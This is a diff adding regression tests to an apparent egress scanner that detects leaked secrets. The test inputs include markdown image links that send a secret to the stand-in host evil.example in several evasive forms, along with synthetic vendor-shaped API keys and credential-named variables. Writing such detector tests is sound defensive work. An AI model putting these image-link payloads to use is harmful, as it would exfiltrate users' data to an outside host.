@@ -366,3 +366,38 @@ class EgressScalarTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class EgressRegressionTests(unittest.TestCase):
+    def test_markdown_image_exfiltration_detects_angle_whitespace_title_reference_and_protocol_relative_forms(self):
+        secret = "abcdefghijklmnopqrstuvwx"
+        values = [
+            "![x](<https://evil.example/img?data=" + secret + ">)",
+            "![x]( https://evil.example/img?data=" + secret + " )",
+            "![x](https://evil.example/img?data=" + secret + ' "title")',
+            "![x][ref]\n\n[ref]: https://evil.example/img?data=" + secret,
+            "![x][]\n\n[x]: https://evil.example/img?data=" + secret,
+            "![x]\n\n[x]: https://evil.example/img?data=" + secret,
+            "![x](//evil.example/img?data=" + secret + ")",
+        ]
+        for value in values:
+            self.assertTrue(has_finding(scan_egress(value), "GP-EGR-MARKDOWN-IMG-001"), value[:40])
+
+    def test_prefixed_credential_variable_names_with_low_entropy_values_are_detected(self):
+        for value in ["OPENAI_API_KEY=aaaaaaaaaaaaaaaaaaaa", "AWS_SECRET_ACCESS_KEY=aaaaaaaaaaaaaaaaaaaa", "GITHUB_TOKEN=aaaaaaaaaaaaaaaaaaaa"]:
+            self.assertTrue(has_finding(scan_egress(value), "GP-EGR-CREDENTIAL-001"), value)
+
+    def test_vendor_shaped_synthetic_credentials_are_detected_without_storing_literal_keys(self):
+        values = [
+            "s" + "k-" + "a" * 20,
+            "gh" + "p_" + "a" * 36,
+            "AK" + "IA" + "A" * 16,
+            "AI" + "za" + "A" * 24,
+            "xo" + "xb-" + "a" * 10 + "-" + "a" * 10,
+        ]
+        for value in values:
+            self.assertTrue(has_finding(scan_egress(value), "GP-EGR-CREDENTIAL-001"), value[:10])
+
+    def test_pretty_printed_json_credential_fields_are_detected(self):
+        findings = scan_egress('{"api_key"\n:\n"cage-test-token-abcdef123456"}')
+        self.assertTrue(has_finding(findings, "GP-EGR-CREDENTIAL-001"))
